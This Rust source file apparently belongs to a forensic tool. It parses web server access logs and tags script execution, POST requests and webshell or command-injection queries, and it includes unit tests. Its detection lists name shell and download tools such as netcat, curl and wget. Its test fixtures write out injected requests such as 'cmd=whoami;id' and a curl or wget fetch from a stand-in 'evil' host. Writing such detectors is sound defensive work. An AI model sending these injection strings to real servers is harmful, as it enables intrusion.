use chrono::{DateTime, NaiveDateTime, Utc};
use regex::Regex;
use std::fs::File;
use std::io::{BufRead, BufReader};
use std::path::Path;

use crate::parsers::evtx::Event;
use crate::parsers::linux::timezone::HostTimezone;
use crate::utils::iso_utc;

/// Server-side script extensions whose requests count as dynamic code execution.
const SCRIPT_EXTENSIONS: &[&str] = &[
    ".jsp", ".jspx", ".jsf", ".php", ".php3", ".php5", ".phtml", ".cgi", ".pl", ".py", ".sh",
    ".asp", ".aspx", ".ashx", ".asmx", ".war",
];

/// Query parameter names typically used by webshells / command injection.
const COMMAND_PARAMS: &[&str] = &[
    "cmd", "exec", "execute", "command", "shell", "run", "system", "payload", "code", "func", "function", "ping",
];

/// Words inside a decoded query that reveal an injected command.
const COMMAND_WORDS: &[&str] = &[
    "whoami", "curl", "wget", "bash", "powershell", "certutil", "nc", "ncat", "netcat", "base64", "/bin/sh", "chmod",
];

/// Minimal percent-decoding (enough for keyword detection; invalid sequences are kept verbatim).
pub fn percent_decode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() && bytes[i + 1].is_ascii_hexdigit() && bytes[i + 2].is_ascii_hexdigit() {
            if let Ok(v) = u8::from_str_radix(&s[i + 1..i + 3], 16) {
                out.push(v);
                i += 3;
                continue;
            }
        }
        out.push(if bytes[i] == b'+' { b' ' } else { bytes[i] });
        i += 1;
    }
    String::from_utf8_lossy(&out).to_string()
}

/// True when the request URI looks like a command injection / webshell invocation.
pub fn has_command_payload(uri: &str) -> bool {
    let query = match uri.split_once('?') {
        Some((_, q)) => q,
        None => return false,
    };
    let decoded = percent_decode(query).to_lowercase();
    for param in decoded.split('&') {
        let (name, value) = match param.split_once('=') {
            Some((n, v)) => (n.trim(), v),
            None => (param.trim(), ""),
        };
        if COMMAND_PARAMS.contains(&name) && !value.is_empty() {
            return true;
        }
        let words: Vec<&str> = value.split(|c: char| c.is_whitespace() || c == ';' || c == '|' || c == '&').collect();
        if words.iter().any(|w| COMMAND_WORDS.contains(w)) {
            return true;
        }
    }
    false
}

/// True when the request path targets a server-side script.
pub fn is_script_request(uri: &str) -> bool {
    let path = uri.split('?').next().unwrap_or(uri).to_lowercase();
    SCRIPT_EXTENSIONS.iter().any(|ext| path.ends_with(ext) || path.contains(&format!("{}/", ext)))
}

/// Parses web server access logs (Apache, Nginx, GlassFish/Tomcat) for dynamic script
/// execution, command injection payloads and POST requests.
pub fn parse_web_access_log(file_path: &Path, computer_name: &str, tz: &HostTimezone) -> Vec<Event> {
    let mut events = Vec::new();
    let file = match File::open(file_path) {
        Ok(f) => f,
        Err(_) => return events,
    };

    // Common / Combined Log Format:
    // 10.240.240.86 - - [23/Sep/2026:15:51:56 +0000] "POST /rlif.jsp HTTP/1.1" 200 4096 "..." "..."
    let log_re = match Regex::new(
        r#"^(\S+)\s+\S+\s+(\S+)\s+\[([^\]]+)\]\s+"([A-Z]+)\s+([^ "]+)(?:\s+HTTP/[0-9.]+)?"\s+(\d{3})"#,
    ) {
        Ok(r) => r,
        Err(_) => return events,
    };

    let reader = BufReader::new(file);

    for line_res in reader.lines() {
        let line = match line_res {
            Ok(l) => l,
            Err(_) => continue,
        };

        let caps = match log_re.captures(&line) {
            Some(c) => c,
            None => continue,
        };
        let client_ip = caps[1].to_string();
        let auth_user = &caps[2];
        let raw_date = &caps[3];
        let method = &caps[4];
        let uri = &caps[5];
        let status_code = &caps[6];

        let is_script = is_script_request(uri);
        let has_payload = has_command_payload(uri);
        let is_post = method == "POST";

        if !(is_script || has_payload || is_post) {
            continue;
        }

        // "23/Sep/2026:15:51:56 +0000" (zone honoured) or without zone (host wall-clock time)
        let iso_ts = match DateTime::parse_from_str(raw_date, "%d/%b/%Y:%H:%M:%S %z") {
            Ok(dt) => iso_utc(&dt.with_timezone(&Utc)),
            Err(_) => match NaiveDateTime::parse_from_str(raw_date, "%d/%b/%Y:%H:%M:%S") {
                Ok(ndt) => iso_utc(&tz.local_to_utc(ndt)),
                Err(_) => continue,
            },
        };

        let script_name = uri.split('?').next().unwrap_or(uri).to_string();
        let artifact_label = if has_payload {
            "linux:web:command_injection"
        } else if is_script {
            "linux:web:script_execution"
        } else {
            "linux:web:http_post"
        };

        events.push(Event {
            timestamp: iso_ts,
            computer: computer_name.to_string(),
            artifact: artifact_label.to_string(),
            event_id: 0,
            pid: 0,
            subject_username: client_ip.clone(),
            target_username: if auth_user == "-" { "www-data/web".to_string() } else { auth_user.to_string() },
            processname: script_name,
            commandline: Some(format!("{} {} (Status: {}, Client: {})", method, uri, status_code, client_ip)),
            parentprocessname: "httpd/nginx".to_string(),
        });
    }

    events
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    #[test]
    fn test_parse_web_log() {
        let temp_file = std::env::temp_dir().join(format!("test_web_{}.log", std::process::id()));
        {
            let mut f = File::create(&temp_file).unwrap();
            writeln!(f, r#"10.240.240.86 - - [23/Sep/2026:15:51:56 +0000] "POST /rlif.jsp HTTP/1.1" 200 4096 "-" "curl/7.29.0""#).unwrap();
            writeln!(f, r#"10.240.240.86 - - [23/Sep/2026:15:52:00 +0000] "GET /index.html HTTP/1.1" 200 120 "-" "-""#).unwrap();
            // Benign URLs containing "id" / ".sh" substrings must NOT be flagged
            writeln!(f, r#"10.0.0.1 - - [23/Sep/2026:15:53:00 +0000] "GET /video/guide.shtml?android=1 HTTP/1.1" 200 120 "-" "-""#).unwrap();
            writeln!(f, r#"10.0.0.1 - - [23/Sep/2026:15:53:01 +0000] "GET /static/app.js?v=1234 HTTP/1.1" 200 120 "-" "-""#).unwrap();
            // Command injection via query parameter (URL encoded)
            writeln!(f, r#"10.0.0.9 - - [23/Sep/2026:15:54:00 +0200] "GET /shell.php?cmd=whoami%3Bid HTTP/1.1" 200 120 "-" "-""#).unwrap();
            writeln!(f, r#"10.0.0.9 - - [23/Sep/2026:15:54:01 +0200] "GET /img.png?x=curl+http://evil/a HTTP/1.1" 404 120 "-" "-""#).unwrap();
        }

        let events = parse_web_access_log(&temp_file, "WEBHOST", &HostTimezone::utc());
        let _ = std::fs::remove_file(&temp_file);

        assert_eq!(events.len(), 3, "{:?}", events);
        assert_eq!(events[0].processname, "/rlif.jsp");
        assert_eq!(events[0].subject_username, "10.240.240.86");
        assert_eq!(events[0].artifact, "linux:web:script_execution");
        assert_eq!(events[0].timestamp, "2026-09-23T15:51:56.000000Z");

        assert_eq!(events[1].artifact, "linux:web:command_injection");
        assert_eq!(events[1].timestamp, "2026-09-23T13:54:00.000000Z");
        assert_eq!(events[2].artifact, "linux:web:command_injection");
        assert_eq!(events[2].processname, "/img.png");
    }

    #[test]
    fn test_payload_detection() {
        assert!(has_command_payload("/a.php?cmd=ls"));
        assert!(has_command_payload("/a.php?x=wget%20http://e/x"));
        assert!(!has_command_payload("/a.php?id=5&video=1"));
        assert!(!has_command_payload("/a.php"));
        assert!(is_script_request("/x/y.PHP"));
        assert!(is_script_request("/cgi-bin/test.cgi?x=1"));
        assert!(!is_script_request("/guide.shtml"));
        assert!(!is_script_request("/sample.plist"));
    }
}
